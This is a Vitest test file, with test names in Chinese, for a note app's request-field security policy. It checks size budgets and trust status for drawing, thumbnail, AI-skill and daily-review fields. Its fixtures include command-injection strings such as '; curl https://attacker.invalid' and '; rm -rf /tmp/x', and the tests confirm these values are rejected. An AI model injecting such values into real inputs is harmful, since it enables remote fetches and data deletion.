import { describe, expect, it } from 'vitest';
import { DRAWING_SCENE_MAX_BYTES } from '@lightnote/shared/drawing-note';
import { DRAWING_THUMBNAIL_MAX_BYTES } from '../contentLimits.js';
import { AI_SKILL_NOTE_TRANSFORM_MAX_TEXT_CHARS } from '../aiSkill/limits.js';
import { resolveRequestFieldPolicy } from './requestFieldPolicy.js';

describe('请求字段安全策略', () => {
  it('按方法、规范化路由和完整字段路径匹配业务语义', () => {
    const context = {
      method: 'post',
      path: '/api/note/updateDrawingNote/',
      body: { scene: '{"v":4}' },
    };
    expect(resolveRequestFieldPolicy(context, 'body.scene')).toMatchObject({
      semantic: 'drawing-scene',
      maxSize: DRAWING_SCENE_MAX_BYTES,
      trustedEnvelope: true,
      overBudget: false,
    });
    expect(resolveRequestFieldPolicy(context, 'body.title')).toBeNull();
    expect(resolveRequestFieldPolicy({ ...context, path: '/note/other' }, 'body.scene')).toBeNull();
    expect(resolveRequestFieldPolicy({ ...context, method: 'PUT' }, 'body.scene')).toBeNull();
  });

  it('只有形态与业务预算同时满足的派生载荷才获得业务语义预算', () => {
    const valid = resolveRequestFieldPolicy(
      {
        method: 'POST',
        path: '/note/uploadDrawingThumbnail',
        body: { thumbnail: 'data:image/webp;base64,AAAA' },
      },
      'body.thumbnail',
    );
    const malformed = resolveRequestFieldPolicy(
      {
        method: 'POST',
        path: '/note/uploadDrawingThumbnail',
        body: { thumbnail: '; curl https://attacker.invalid' },
      },
      'body.thumbnail',
    );
    expect(valid).toMatchObject({ semantic: 'webp-data-url', trustedEnvelope: true });
    expect(malformed).toMatchObject({ semantic: 'webp-data-url', trustedEnvelope: false });
  });

  it('Base64 派生载荷按解码后的真实字节数使用业务上限', () => {
    const result = resolveRequestFieldPolicy(
      {
        method: 'POST',
        path: '/note/uploadDrawingThumbnail',
        body: {
          thumbnail: `data:image/webp;base64,${Buffer.alloc(DRAWING_THUMBNAIL_MAX_BYTES + 1).toString('base64')}`,
        },
      },
      'body.thumbnail',
    );
    expect(result).toMatchObject({
      sizeUnit: 'decoded-bytes',
      size: DRAWING_THUMBNAIL_MAX_BYTES + 1,
      overBudget: true,
      trustedEnvelope: false,
    });
  });

  it('按 UTF-8 字节数判断手绘场景业务上限', () => {
    const result = resolveRequestFieldPolicy(
      {
        method: 'POST',
        path: '/note/updateDrawingNote',
        body: { scene: '绘'.repeat(Math.ceil(DRAWING_SCENE_MAX_BYTES / 3) + 1) },
      },
      'body.scene',
    );
    expect(result).toMatchObject({ sizeUnit: 'utf8-bytes', overBudget: true, trustedEnvelope: false });
  });

  it.each(['/ai/skills/execute', '/api/ai/skills/stream/'])('只信任精确 AI 技能的笔记原文字段：%s', (path) => {
    const context = {
      method: 'POST',
      path,
      body: {
        skillId: 'note.transform_text',
        input: { text: 'sudo apt update && sudo apt full-upgrade -y' },
      },
    };
    expect(resolveRequestFieldPolicy(context, 'body.input.text')).toMatchObject({
      semantic: 'ai-note-transform-text',
      maxSize: AI_SKILL_NOTE_TRANSFORM_MAX_TEXT_CHARS,
      trustedEnvelope: true,
      overBudget: false,
      skipSignatureRules: '*',
    });
    expect(
      resolveRequestFieldPolicy({ ...context, body: { ...context.body, skillId: 'help.answer' } }, 'body.input.text'),
    ).toMatchObject({ trustedEnvelope: false });
    expect(
      resolveRequestFieldPolicy(
        {
          ...context,
          body: { ...context.body, input: { text: 'x'.repeat(AI_SKILL_NOTE_TRANSFORM_MAX_TEXT_CHARS + 1) } },
        },
        'body.input.text',
      ),
    ).toMatchObject({ trustedEnvelope: false, overBudget: true });
  });

  it.each([
    ['/api/daily-review/items/item-1/action', 'open', 'daily-review-item-action'],
    ['/daily-review/items/item-1/action', 'open_tag_space', 'daily-review-item-action'],
    ['/daily-review/items/item-1/action', 'snooze_7d', 'daily-review-item-action'],
    ['/daily-review/items/item-1/action', 'dismiss', 'daily-review-item-action'],
    ['/daily-review/today/action', 'skip_today', 'daily-review-session-action'],
    ['/api/daily-review/today/action/', 'resume_today', 'daily-review-session-action'],
  ])('每日回顾 action 只按精确方法、路由、字段和值获得枚举语义：%s %s', (path, action, semantic) => {
    expect(resolveRequestFieldPolicy({ method: 'POST', path, body: { action } }, 'body.action')).toMatchObject({
      semantic,
      trustedEnvelope: true,
      overBudget: false,
    });
  });

  it('每日回顾非法 action 不获得安全豁免', () => {
    expect(
      resolveRequestFieldPolicy(
        { method: 'POST', path: '/daily-review/items/item-1/action', body: { action: '; rm -rf /tmp/x' } },
        'body.action',
      ),
    ).toMatchObject({
      semantic: 'daily-review-item-action',
      trustedEnvelope: false,
      fallbackContext: 'identifier',
    });
    expect(
      resolveRequestFieldPolicy(
        { method: 'PUT', path: '/daily-review/items/item-1/action', body: { action: 'open' } },
        'body.action',
      ),
    ).toBeNull();
  });
});
